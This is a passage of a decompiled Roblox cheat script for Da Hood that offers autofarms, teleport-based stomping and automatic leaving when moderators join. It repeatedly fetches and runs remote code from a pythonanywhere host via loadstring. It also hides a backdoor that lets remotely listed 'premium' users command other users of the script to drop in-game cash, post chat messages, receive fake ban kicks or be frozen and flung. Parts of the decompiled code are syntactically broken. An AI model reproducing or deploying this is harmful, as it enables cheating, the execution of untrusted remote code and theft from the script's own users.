                  local clickDetector14 = game.Workspace.Ignored.Shop["[HeavyWeights] - $281"]:FindFirstChildWhichIsA("ClickDetector")

                  if clickDetector14 then
                    fireclickdetector(clickDetector14)
                  end

                  task.wait()
                  backpack18 = game.Players.LocalPlayer.Backpack
                until (backpack18:FindFirstChild("[HeavyWeights]"))
              end

              local heavyWeights = game.Players.LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]")
              local localPlayer29 = heavyWeights

              if heavyWeights then

                localPlayer29 = not (game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]"))
              end

              if localPlayer29 then
                game.Players.LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]").Parent = game.Players.LocalPlayer.Character
              end

              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
                563, 109, -1012
              )

              game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]"):Activate()
              task.wait()
            end

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position8)
            game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]").Parent = game.Players.LocalPlayer.Backpack

            return
          end

          helper22()

          game.Players.LocalPlayer.CharacterAdded:Connect(function()

            game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

            if getgenv().WeightFarm then
              task.wait(1)
              helper22()
            end

            return
          end)

          return
        end)

        val142 = ui

        ui:AddToggle(autofarm, "Lettuce Farm", false, function(lettuceFarm)
          getgenv().LettuceFarm = lettuceFarm
          local position9 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

          local function helper23()

            while getgenv().LettuceFarm do

              game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

              local localPlayer30 = not (game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]"))
              local localPlayer31 = localPlayer30

              if localPlayer30 then

                localPlayer31 = not (game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]"))
              end

              if localPlayer31 then

                game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]")

                repeat
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Lettuce] - $6"].Head.CFrame

                  local clickDetector15 = game.Workspace.Ignored.Shop["[Lettuce] - $6"]:FindFirstChildWhichIsA("ClickDetector")

                  if clickDetector15 then
                    fireclickdetector(clickDetector15)
                  end

                  task.wait()
                  backpack20 = game.Players.LocalPlayer.Backpack
                until (backpack20:FindFirstChild("[Lettuce]"))
              end

              local lettuce = game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]")
              local localPlayer32 = lettuce

              if lettuce then

                localPlayer32 = not (game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]"))
              end

              if localPlayer32 then
                game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]").Parent = game.Players.LocalPlayer.Character
              end

              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
                563, 109, -1012
              )

              if (game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]")) then

                game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]"):Activate()
              end

              task.wait()
            end

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position9)

            if (game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]")) then
              game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]").Parent = game.Players.LocalPlayer.Backpack
            end

            return
          end

          helper23()

          game.Players.LocalPlayer.CharacterAdded:Connect(function()

            game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

            if getgenv().LettuceFarm then
              task.wait(1)
              helper23()
            end

            return
          end)

          return
        end)

        function iterate7()

          while getgenv().StompFarm do

            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

            for index15, value85 in ipairs(game.Players:GetPlayers()) do
              local localPlayer33 = value85 ~= game.Players.LocalPlayer
              local val513 = localPlayer33

              if localPlayer33 then
                local character76 = value85.Character
                local val514 = character76

                if character76 then

                  local upperTorso2 = value85.Character:FindFirstChild("UpperTorso")
                  local gRABBING_CONSTRAINT3 = upperTorso2

                  if upperTorso2 then

                    gRABBING_CONSTRAINT3 = not (value85.Character:FindFirstChild("GRABBING_CONSTRAINT"))
                  end

                  val514 = gRABBING_CONSTRAINT3
                end

                val513 = val514
              end

              if val513 then

                if (value85.Character:FindFirstChild("BodyEffects")) then
                  while true do
                    local stompFarm = getgenv().StompFarm
                    local val515 = stompFarm

                    if stompFarm then

                      val515 = value85.Character.BodyEffects["K.O"].Value == true
                        and value85.Character.BodyEffects.Dead.Value == false
                    end

                    if val515 then
                      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(value85.Character.UpperTorso.Position)) * (CFrame.new(
                        0, 3, 0
                      ))

                      game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                      task.wait()
                    else
                      break
                    end
                  end
                end
              end
            end

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
              9000000000, 9000000000, 9000000000
            )

            task.wait()
          end

          if not getgenv().StompFarm then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
              -326, 81, -301
            )
          end

          return
        end

        val143 = ui

        ui:AddToggle(autofarm, "Stomp Farm", false, function(p85)
          getgenv().StompFarm = p85

          if p85 then
            spawn(function()
              iterate7()
              return
            end)
          end

          return
        end)

        game.Players.LocalPlayer.CharacterAdded:Connect(function()

          game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

          if getgenv().StompFarm then
            spawn(function()
              iterate7()
              return
            end)
          end

          return
        end)

        val225 = {}
        val144 = ui

        ui:AddToggle(misc, "Auto Detect TBO users", false, function(p86)
          table.clear(val225)
          local helper24, helper25, helper26

          if not p86 then
            return
          else
            function helper24(val516)

              if not val516.Character then
                return
              else

                local humanoid16 = val516.Character:FindFirstChildOfClass("Humanoid")

                if not humanoid16 then
                  return
                else

                  humanoid16.AnimationPlayed:Connect(function(p88)
                    if p88.Animation.AnimationId == "rbxassetid://3337994105" then
                      if not val225[val516.UserId] then
                        val225[val516.UserId] = true

                        notify({
                          Description = val516.Name .. " is using TBO.", Title = "TBO", Duration = 6, })
                      end
                    end

                    return
                  end)

                  return
                end
              end
            end

            function helper25(val517, val518)
              if not val517 then
                return
              else
                val517:WaitForChild("Humanoid")
                helper24(val518)
                return
              end
            end

            function helper26(val519)

              if val519.Character then
                helper25(val519.Character, val519)
              end

              val519.CharacterAdded:Connect(function(p92)
                helper25(p92, val519)
                return
              end)

              return
            end

            local players10 = game:GetService("Players")

            for index16, value86 in ipairs(players10:GetPlayers()) do
              if value86 ~= game.Players.LocalPlayer then
                helper26(value86)
              end
            end

            local playerAdded = game:GetService("Players").PlayerAdded

            playerAdded:Connect(function(p93)
              helper26(p93)
              return
            end)

            return
          end
        end)

        val226 = {}
        val145 = ui

        ui:AddToggle(misc, "Auto Detect Stand users", false, function(p94)
          table.clear(val226)
          local helper27, helper28, helper29

          if not p94 then
            return
          else
            function helper27(val520)

              if not val520.Character then
                return
              else

                local humanoid17 = val520.Character:FindFirstChildOfClass("Humanoid")

                if not humanoid17 then
                  return
                else
                  local 

                  humanoid17.AnimationPlayed:Connect(function(p96)
                    local val521 = p96.Animation.AnimationId == "rbxassetid://3541114300"
                    local val522 = val521

                    if not val521 then
                      local val523 = p96.Animation.AnimationId == "rbxassetid://3084858603"
                      local val524 = val523

                      if not val523 then
                        local val525 = p96.Animation.AnimationId == "rbxassetid://3541044388"
                        local val526 = val525

                        if not val525 then

                          val526 = p96.Animation.AnimationId == "rbxassetid://13850634687"
                            or p96.Animation.AnimationId == "rbxassetid://13850660986"
                        end

                        val524 = val526
                      end

                      val522 = val524
                    end

                    if val522 then
                      if not val226[val520.UserId] then
                        val226[val520.UserId] = true

                        notify({
                          Description = val520.Name .. " is using Stand.", Title = "TBO", Duration = 6, })
                      end
                    end

                    return
                  end)

                  return
                end
              end
            end

            function helper28(val527, val528)
              if not val527 then
                return
              else
                val527:WaitForChild("Humanoid")
                helper27(val528)
                return
              end
            end

            function helper29(val529)

              if val529.Character then
                helper28(val529.Character, val529)
              end

              val529.CharacterAdded:Connect(function(p100)
                helper28(p100, val529)
                return
              end)

              return
            end

            local players11 = game:GetService("Players")

            for index17, value87 in ipairs(players11:GetPlayers()) do
              if value87 ~= game.Players.LocalPlayer then
                helper29(value87)
              end
            end

            local playerAdded2 = game:GetService("Players").PlayerAdded

            playerAdded2:Connect(function(p101)
              helper29(p101)
              return
            end)

            return
          end
        end)

        val146 = ui

        ui:AddToggle(misc, "anti sit", false, function(p102)

          for index18, value88 in ipairs(game.workspace:GetDescendants()) do
            if (value88:IsA("Seat")) then
              value88.Disabled = p102
            end
          end

          return
        end)

        val147 = ui

        ui:AddButton(misc, "Redeem Codes", function()

          local codes = loadstring(game:HttpGet("https://peeky.pythonanywhere.com/Codes"))()

          if (type(codes)) == "table" then
            for key70, value89 in pairs(codes) do
              notify({
                Description = "Redeeming code: " .. value89, Title = "Redeem Codes", Duration = 5, })

              game:GetService("ReplicatedStorage").MainEvent:FireServer(
                "EnterPromoCode", value89
              )

              task.wait(5)
            end
          end

          return
        end)

        val148 = ui

        ui:AddButton(misc, "become a police/leave", function()
          if game.Players.LocalPlayer.leaderstats.Wanted.Value == 0 then
            fireclickdetector(game.workspace.Ignored["Join/Leave"].ClickDetector)
            task.wait()

            repeat
              task.wait()
            until game.Players.LocalPlayer.PlayerGui.MainScreenGui.AreYouSure.Visible == true

            game.Players.LocalPlayer.PlayerGui.MainScreenGui.AreYouSure.Visible = false
            firesignal(game.Players.LocalPlayer.PlayerGui.MainScreenGui.AreYouSure.TextButton.MouseButton1Click)
          else
            notify({
              Description = "you must have 0 bounty to become a police.", Title = "TBO", Duration = 3, })
          end

          return
        end)

        val149 = ui

        ui:AddButton(settings, "copy discord invite", function()
          setclipboard("https://discord.gg/jwYqu66bqm")
          return
        end)

        val150 = ui

        ui:AddButton(settings, "Rejoin", function()
          notify({ Description = "Rejoiningâ¦", Title = "Rejoin", Duration = 6 })

          local queueOnTeleport = syn and syn.queue_on_teleport
          local val530 = queueOnTeleport

          if not queueOnTeleport then
            local queueOnTeleport2 = queue_on_teleport
            local queueOnTeleport3 = queueOnTeleport2

            if not queueOnTeleport2 then

              queueOnTeleport3 = fluxus and fluxus.queue_on_teleport
            end

            val530 = queueOnTeleport3
          end

          val530("loadstring(game:HttpGet('https://peeky.pythonanywhere.com/DaHoodGui'))()")

          local teleportService = game:GetService("TeleportService")
          teleportService:Teleport(game.PlaceId)

          return
        end)

        val151 = ui

        ui:AddButton(settings, "Server Hop", function()
          notify({ Description = "Server Hopingâ¦", Title = "Server Hop", Duration = 6 })

          local queueOnTeleport4 = syn and syn.queue_on_teleport
          local val531 = queueOnTeleport4

          if not queueOnTeleport4 then
            local queueOnTeleport5 = queue_on_teleport
            local queueOnTeleport6 = queueOnTeleport5

            if not queueOnTeleport5 then

              queueOnTeleport6 = fluxus and fluxus.queue_on_teleport
            end

            val531 = queueOnTeleport6
          end

          val531("loadstring(game:HttpGet('https://peeky.pythonanywhere.com/DaHoodGui'))()")

          local httpService2 = game:GetService("HttpService")

          local teleportService2 = game:GetService("TeleportService")

          local stats = game:GetService("Stats")

          local function fetchData(val532, val533)
            local val534 = string.format(
              "https://games.roblox.com/val/games/%d/servers/Public?limit=%d", val532, val533
            )

            local val535, success4 = pcall(function()

              return httpService2:JSONDecode(game:HttpGet(val534))
            end)

            local data = val535

            if val535 then

              data = success4 and success4.data
            end

            if data then
              return success4.data
            else
              return nil
            end
          end

          local placeId = game.PlaceId
          local val536 = fetchData(placeId, 100)

          if not val536 then
            return
          else
            local element17 = val536[1]

            for key71, value90 in pairs(val536) do
              if value90.ping < element17.ping then
                element17 = value90
              end
            end

            task.wait(5)

            if (tonumber(stats.Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")))
              >= 100 then
              teleportService2:TeleportToPlaceInstance(placeId, element17.id)
            else
            end

            return
          end
        end)

        val152 = ui

        ui:AddButton(settings, "Server Hop To Lowest Server", function()

          notify({
            Description = "Server Hoping To Lowest Serverâ¦", Title = "Server Hop", Duration = 6, })

          local queueOnTeleport7 = syn and syn.queue_on_teleport
          local val537 = queueOnTeleport7

          if not queueOnTeleport7 then
            local queueOnTeleport8 = queue_on_teleport
            local queueOnTeleport9 = queueOnTeleport8

            if not queueOnTeleport8 then

              queueOnTeleport9 = fluxus and fluxus.queue_on_teleport
            end

            val537 = queueOnTeleport9
          end

          val537("loadstring(game:HttpGet('https://peeky.pythonanywhere.com/DaHoodGui'))()")
          local jsonDecode = {}
          local nextPageCursor = ""
          local hour = os.date("!*t").hour

          local teleportService3 = game:GetService("TeleportService")

          local httpService3 = game:GetService("HttpService")

          local players12 = game:GetService("Players")

          if not (pcall(function()
            jsonDecode = httpService3:JSONDecode(readfile("server-hop-temp.json"))
            return
          end)) then
            table.insert(jsonDecode, hour)

            pcall(function()
              writefile("server-hop-temp.json", httpService3:JSONEncode(jsonDecode))
              return
            end)
          end

          local function fetchData2(val538)

            if nextPageCursor == "" then

              jsonDecode2 = httpService3:JSONDecode(game:HttpGet("https://games.roblox.com/val/games/"
                .. val538 .. "/servers/Public?sortOrder=Asc&limit=100"))
            else

              jsonDecode2 = httpService3:JSONDecode(game:HttpGet("https://games.roblox.com/val/games/"
                .. val538 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. nextPageCursor))
            end

            local strVal2 = ""
            local nextPageCursor2 = jsonDecode2.nextPageCursor
            local val539 = nextPageCursor2

            if nextPageCursor2 then

              val539 = jsonDecode2.nextPageCursor ~= "null" and jsonDecode2.nextPageCursor ~= nil
            end

            if val539 then
              nextPageCursor = jsonDecode2.nextPageCursor
            end

            local count = 0
            local val540 = false

            for key72, value91 in pairs(jsonDecode2.data) do
              local val541 = true
              strVal2 = tostring(value91.id)

              if (tonumber(value91.maxPlayers)) > (tonumber(value91.playing)) then
                for key73, value92 in pairs(jsonDecode) do
                  if count ~= 0 then
                    if strVal2 == (tostring(value92)) then
                      val541 = false
                    end
                  else
                    if (tonumber(hour)) ~= (tonumber(value92)) then
                      pcall(function()
                        delfile("server-hop-temp.json")
                        jsonDecode = {}
                        table.insert(jsonDecode, hour)
                        return
                      end)
                    end
                  end

                  count = count + 1
                end

                if val541 == true then
                  table.insert(jsonDecode, strVal2)
                  val540 = true
                  wait()

                  pcall(function()
                    writefile("server-hop-temp.json", httpService3:JSONEncode(jsonDecode))
                    wait()
                    teleportService3:TeleportToPlaceInstance(val538, strVal2, players12.LocalPlayer)
                    return
                  end)

                  wait(4)
                end
              end
            end

            if not val540 then

              local teleportService4 = game:GetService("TeleportService")
              teleportService4:Teleport(game.PlaceId)
            end

            return
          end

          local object6 = {}

          function object6:Teleport(p106)
            while (wait()) do
              pcall(function()
                fetchData2(p106)

                if nextPageCursor ~= "" then
                  fetchData2(p106)
                end

                return
              end)
            end

            return
          end

          object6:Teleport(game.PlaceId)

          return
        end)

        val153 = ui
        ui:AddLabel(credits, "peeky.co (Owner)")
        val154 = ui
        ui:AddLabel(credits, ".z4ka (Tester)")

        function checkPlayerGroupRole(val542, val543, val544)
          if (val542:IsInGroup(val543)) then
            if (val542:GetRoleInGroup(val543)) == val544 then
              return true
            else
              return false
            end
          else
            return false
          end
        end

        val227 = {
          { 4698921, "Moderators" }, { 4698921, "Monetization" }, { 4698921, "Devs" }, { 4698921, "ADMIN" }, { 4698921, "Owner" }, { 8068202, "ãðãTeam" }, { 4698921, "ãðãManager" }, { 4698921, "ãðãOverseer" }, { 17215700, "Advisor" }, { 17215700, "Staff" }, { 17215700, "Manager" }, { 17215700, "Overseer" }, }

        game.Players.PlayerAdded:Connect(function(player3)

          for key74, value93 in pairs(val227) do
            if (checkPlayerGroupRole(player3, value93[1], value93[2])) then

              game.Players.LocalPlayer:Kick("Moderator Joined: " .. player3.Name)
            end
          end

          return
        end)

        for key75, value94 in pairs(game.Players:GetPlayers()) do
          for key76, value95 in pairs(val227) do
            if (checkPlayerGroupRole(value94, value95[1], value95[2])) then

              game.Players.LocalPlayer:Kick("Moderator here: " .. value94.Name)
            end
          end
        end

        val155, success = pcall(function()

          return loadstring(game:HttpGet("https://peeky.pythonanywhere.com/Premium"))()
        end)

        val156 = val155

        if val155 and (typeof(success)) == "table" then
          PremiumUsers = success
        else
          PremiumUsers = {}
        end

        function iterate8(val545)
          for index19, value96 in ipairs(PremiumUsers) do
            if value96 == val545 then
              return true
            end
          end

          return false
        end

        val228 = false
        val229 = {}

        function commands(val546, localPlayer34)
          local val547 = string.lower(val546)
          local val548 = string.split(val547, " ")

          local function helper30(val549)
            local val550 = val548[1] == "!" .. val549

            return val550 or string.find(val547, "/e " .. val549)
          end

          local bring = (helper30("bring")) and localPlayer34 ~= game.Players.LocalPlayer.Name

          if bring then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[localPlayer34].Character.Head.Position)
          end

          if (helper30("kick")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.Players.LocalPlayer:Kick("You have been kicked from this server.")
            wait(10)
          end

          if (helper30("sus")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            game.Players.LocalPlayer.Character.UpperTorso.MeshId = "rbxassetid://6686375902"
            game.Players.LocalPlayer.Character.UpperTorso.TextureID = "rbxassetid://6686375937"
            game.Players.LocalPlayer.Character.UpperTorso.Size = Vector3.new(0.1, 0.1, 0.06)

            for key77, value97 in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
              if (value97:IsA("Accessory")) then
                value97.Parent = workspace
                value97:Destroy()
              end
            end

            game.Players.LocalPlayer.Character.LowerTorso.Transparency = 1
            game.Players.LocalPlayer.Character.RightHand.Transparency = 1
            game.Players.LocalPlayer.Character.LeftLowerArm.Transparency = 1
            game.Players.LocalPlayer.Character.RightLowerArm.Transparency = 1
            game.Players.LocalPlayer.Character.LeftUpperArm.Transparency = 1
            game.Players.LocalPlayer.Character.RightUpperArm.Transparency = 1
            game.Players.LocalPlayer.Character.LeftLowerLeg.Transparency = 1
            game.Players.LocalPlayer.Character.LeftUpperLeg.Transparency = 1
            game.Players.LocalPlayer.Character.LeftFoot.Transparency = 1
            game.Players.LocalPlayer.Character.RightFoot.Transparency = 1
            game.Players.LocalPlayer.Character.RightLowerLeg.Transparency = 1
            game.Players.LocalPlayer.Character.RightUpperLeg.Transparency = 1
            game.Players.LocalPlayer.Character.LeftHand.Transparency = 1
            game.Players.LocalPlayer.Character.Head.Transparency = 1
            game.Players.LocalPlayer.Character.Head.face.Texture = 0
          end

          if (helper30("reset")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
            task.wait()

            game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
            task.wait()

            game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
          end

          if (helper30("re")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.ReplicatedStorage.MainEvent:FireServer("ResetNew")

            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Dead")
          end

          local val551 = false

          local function waitLoop10(val552)
            val551 = val552

            if val551 then
              while val551 do
                firetouchinterest(
                  game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").MAP.Indestructible.Lasers.Part, 0
                )

                firetouchinterest(
                  game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").MAP.Indestructible.Lasers.Part, 1
                )

                task.wait()
              end
            end

            return
          end

          if (helper30("ragdoll")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            waitLoop10(true)
          end

          if (helper30("unragdoll")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            waitLoop10(false)
          end

          if (helper30("say")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.TextChatService.TextChannels.RBXGeneral:SendAsync(val546:sub(#val548[1] + 2))
          end

          if (helper30("test")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            wait(0.3)

            local replicatedStorage2 = game:GetService("ReplicatedStorage")

            replicatedStorage2:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack({
              [1] = "daddys home", [2] = "All", }))

            wait()

            local replicatedStorage3 = game:GetService("ReplicatedStorage")

            replicatedStorage3:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack({
              [1] = "daddys home", [2] = "All", }))
          end

          if (helper30("fling")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
              500000, 500000, 500000
            )
          end

          if (helper30("trollban")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.Players.LocalPlayer:Kick("PERMA- BANNED")
            wait(10)
          end

          local loadAnimation21, connect12, val553, val554, helper31

          if (helper30("benx")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            val228 = true

            local humanoid18 = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")

            loadAnimation21 = humanoid18:LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
            loadAnimation21.Looped = true
            loadAnimation21:Play()

            local 

            local function helper32()
              connect12:Disconnect()
              loadAnimation21:Stop()
              return
            end

            val553 = 0.5
            val554 = false
            connect12 = nil

            function helper31()

              local findFirstChild10 = game.Workspace.Players:FindFirstChild(localPlayer34)
              local findFirstChild11 = findFirstChild10

              if not findFirstChild10 then

                findFirstChild11 = game.Workspace:FindFirstChild(localPlayer34)
              end

              if findFirstChild11 then
                if val554 == true then
                  val553 = val553 - 0.1
                else
                  val553 = val553 + 0.1
                end

                if val553 >= 2 then
                  val554 = true
                else
                  if val553 < 0.5 then
                    val554 = false
                  end
                end

                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[localPlayer34].Character.HumanoidRootPart.CFrame
                  + game.Players[localPlayer34].Character.HumanoidRootPart.CFrame.lookVector * val553
              end

              return
            end

            local function helper33()

              connect12 = game:GetService("RunService").Heartbeat:Connect(helper31)
              return
            end

            helper33()

            repeat
              wait()
            until val228 == false

            helper32()
          else

            if (helper30("unbenx")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
              val228 = false
            end
          end

          if (helper30("freeze")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
          end

          local unfreeze = (helper30("unfreeze")) and localPlayer34 ~= game.Players.LocalPlayer.Name
          local thaw = unfreeze

          if not unfreeze then

            thaw = (helper30("thaw")) and localPlayer34 ~= game.Players.LocalPlayer.Name
          end

          if thaw then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
          end

          local screenGui2, sound

          if (helper30("jumpscare")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            screenGui2 = Instance.new("ScreenGui")
            local imageLabel = Instance.new("ImageLabel")

            screenGui2.Name = math.random(11111, 99999)
            screenGui2.Parent = game.CoreGui
            screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            imageLabel.Parent = screenGui2
            imageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            imageLabel.Size = UDim2.new(1, 0, 1, 0)
            imageLabel.Image = "http://www.roblox.com/asset/?id=9407437637"

            sound = Instance.new("Sound")
            sound.Volume = 2
            sound.Parent = game.SoundService
            sound.SoundId = "rbxassetid://6754147732"
            sound:Play()

            delay(3, function()
              screenGui2:Destroy()
              sound:Destroy()
              return
            end)
          end

          if (helper30("fakeban")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.Players.LocalPlayer:Kick("Mod Team has BANNED you!")
            wait(10)
          end

          if (helper30("modban")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.Players.LocalPlayer:Kick("User BANNED")
            wait(10)
          end

          local rejoin = (helper30("rejoin")) and localPlayer34 ~= game.Players.LocalPlayer.Name
          local rejoin2 = rejoin

          if not rejoin then

            rejoin2 = (helper30("rejoin")) and localPlayer34 ~= game.Players.LocalPlayer.Name
          end

          if rejoin2 then

            local teleportService5 = game:GetService("TeleportService")
            teleportService5:Teleport(game.PlaceId)
          end

          if (helper30("dance")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            local animation21 = Instance.new("Animation")
            animation21.AnimationId = "rbxassetid://11710529975"

            game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation21):Play()
          end

          if (helper30("dance2")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            local animation22 = Instance.new("Animation")
            animation22.AnimationId = "rbxassetid://6789372743"

            game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation22):Play()
          end

          if (helper30("sit")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            game.Players.LocalPlayer.Character.Humanoid.Sit = true
          end

          if (helper30("unsit")) and localPlayer34 ~= game.Players.LocalPlayer.Name then
            game.Players.LocalPlayer.Character.Humanoid.Sit = false
          end

          local teleportService6, players13

          if (helper30("anti")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            teleportService6 = game:GetService("TeleportService")

            players13 = game:GetService("Players")

            game:GetService("GuiService").MenuOpened:Connect(function()
              for index20, value98 in ipairs(players13:GetPlayers()) do
                teleportService6:Teleport(game.PlaceId, value98)
              end

              return
            end)
          end

          if (helper30("dropcash")) and localPlayer34 ~= game.Players.LocalPlayer.Name then

            game.ReplicatedStorage.MainEvent:FireServer("DropMoney", "10000")
          end

          if (helper30("shield")) then

            if (iterate8(game.Players.LocalPlayer.UserId)) and localPlayer34 == game.Players.LocalPlayer.Name then

              for key78, value99 in pairs(game.Players:GetPlayers()) do

                if (iterate8(value99.UserId)) and value99.Name ~= localPlayer34 then
                  val229[value99.UserId] = true
                end
              end

              notify({
                Description = "muted other premiums.", Title = "Shield enabled.", Duration = 6, })
            end
          end

          if (helper30("unshield")) then

            if (iterate8(game.Players.LocalPlayer.UserId)) and localPlayer34 == game.Players.LocalPlayer.Name then

              for key79, value100 in pairs(game.Players:GetPlayers()) do
                val229[value100.UserId] = nil
              end

              notify({
                Description = "unmuted other premiums.", Title = "Shield disabled.", Duration = 6, })
            end
          end

          return
        end

        game.Players.PlayerAdded:Connect(function(player4)

          if (iterate8(player4.UserId)) then

            player4.Chatted:Connect(function(message2)
              if not val229[player4.UserId] then
                commands(message2, player4.Name)
              end

              return
            end)
          end

          return
        end)

        for key80, value101 in pairs(game.Players:GetPlayers()) do
          local element18 = value101

          if (iterate8(element18.UserId)) then

            element18.Chatted:Connect(function(message3)
              if not val229[element18.UserId] then
                commands(message3, element18.Name)
              end

              return
            end)
          end
        end

        ::L14610649::
        return
      end
    end
  else
    Notify({
      Description = "the script is currently down, check our discord for more information.", Title = "TBO", Duration = 6, })

    setclipboard("https://discord.gg/jwYqu66bqm")
    goto L14610649
  end
end